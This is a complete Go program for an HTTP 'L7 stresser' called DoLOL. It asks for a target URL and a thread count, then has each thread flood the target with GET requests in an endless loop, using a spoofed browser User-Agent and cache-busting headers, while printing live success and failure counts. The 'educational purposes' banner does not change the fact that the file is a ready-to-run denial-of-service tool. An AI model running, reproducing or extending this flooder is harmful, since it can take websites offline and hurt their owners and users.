package main

import (
	"fmt"
	"net/http"
	"sync"
	"sync/atomic"
	"time"
)

const (
	Red    = "\033[31m"
	Green  = "\033[32m"
	Yellow = "\033[33m"
	Blue   = "\033[34m"
	Cyan   = "\033[36m"
	Reset  = "\033[0m"
)

var (
	successCount uint64
	errorCount   uint64
)

func banner() {
	fmt.Println(Red + `
    ____         _        ____  _      
   |  _ \  ___  | |      / __ \| |     
   | | | |/ _ \ | |     | |  | | |     
   | |_| | (_) || |____ | |__| | |____ 
   |____/ \___/ |______(_)____/|______|
    >> HIGH-SPEED L7 STRESSER v1.1 <<
	` + Reset)
	fmt.Println(Cyan + "------------------------------------------" + Reset)
	fmt.Println(Yellow + "[*] Developed for Educational Purposes" + Reset)
	fmt.Println(Yellow + "[*] Coded in Golang (High Concurrency)" + Reset)
	fmt.Println(Cyan + "------------------------------------------\n" + Reset)
}

func attack(target string, id int, wg *sync.WaitGroup) {
	defer wg.Done()
	client := &http.Client{
		Timeout: time.Second * 10,
	}

	for {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
		req.Header.Set("Cache-Control", "no-cache")

		resp, err := client.Do(req)
		if err == nil {
			atomic.AddUint64(&successCount, 1)
			resp.Body.Close()
		} else {
			atomic.AddUint64(&errorCount, 1)
		}
	}
}

func main() {
	banner()

	var target string
	var threads int

	fmt.Print(Blue + "[?] Enter Target URL (e.g., http://target.com): " + Reset)
	fmt.Scanln(&target)

	fmt.Print(Blue + "[?] Enter Number of Threads (Goroutines): " + Reset)
	fmt.Scanln(&threads)

	fmt.Printf("\n"+Yellow+"[!] Launching Attack on: %s"+Reset+"\n", target)
	fmt.Printf(Yellow+"[!] Threads: %d | Press Ctrl+C to stop."+Reset+"\n\n", threads)

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go attack(target, i, &wg)
	}

	go func() {
		for {
			fmt.Printf("\r\033[K"+Green+"[+] SUCCESS: %d "+Reset+"|"+Red+" [-] FAILED: %d"+Reset,
				atomic.LoadUint64(&successCount),
				atomic.LoadUint64(&errorCount))
			time.Sleep(100 * time.Millisecond)
		}
	}()

	wg.Wait()
}

